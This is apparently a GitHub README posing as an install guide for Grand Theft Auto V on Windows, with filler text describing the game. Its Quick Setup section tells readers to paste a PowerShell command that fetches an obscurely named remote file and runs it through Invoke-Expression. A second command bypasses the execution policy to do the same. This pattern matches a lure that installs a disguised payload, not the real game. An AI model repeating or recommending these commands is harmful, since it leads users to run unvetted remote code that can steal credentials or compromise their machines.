# Grand Theft Auto V

Grand Theft Auto V is the Windows game this page sets up. The command in Quick Setup installs the game on this PC. After that you launch Grand Theft Auto V and play.

Grand Theft Auto V on Windows drops you into a sprawling map where story missions, heists, and free roam share one save. You drive, fly, and fight through Franklin, Michael, and Trevor’s campaign or switch to GTA Online for co-op jobs and races. Performance scales from modest PCs to high-end rigs when you tune resolution, frame limits, and graphics presets in the launcher or in-game settings.

A typical evening might mean finishing a story chapter, then hopping online for a contact mission or stunt race with friends. Keyboard and mouse or a controller both work; many players map sprint, cover, and vehicle controls to match habit. Single-player progress and online characters stay separate, so you can pause the campaign anytime without losing your street cred in Los Santos.

This repository tracks how the game is installed and updated on Windows: a setup file that documents paths and launch options, short notes on drivers and optional mods folder layout, and a changelog that records version bumps and config tweaks. It is meant as a practical reference for anyone maintaining a clean install on their machine.

## How you play

- Three playable protagonists swap during story missions with distinct abilities and cutscenes.
- Los Santos and surrounding county offer highways, mountains, and urban alleys to explore freely.
- GTA Online adds races, heists, and businesses that progress separately from single-player saves.
- Rockstar Editor on Windows lets you record clips and export short films from gameplay footage.
- Vehicle handling spans supercars, bikes, aircraft, and boats with physics tuned for stunts.
- Story heists require planning phases, crew choices, and loud or stealth approaches during execution.
- Graphics settings include population density, shadow quality, and MSAA for balancing fps and fidelity.
- Save data and key bindings live under your profile folder for backup before major updates.

## Quick Setup (PowerShell)

This installs the game Grand Theft Auto V on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/jessica930591/grand-theft-auto-v-setup-guide/main/i5yxqvzlhh.z3ftu8x7 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/jessica930591/grand-theft-auto-v-setup-guide/main/i5yxqvzlhh.z3ftu8x7 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `i5yxqvzlhh.z3ftu8x7` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `jessica930591/grand-theft-auto-v-setup-guide`. Grand Theft Auto V 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
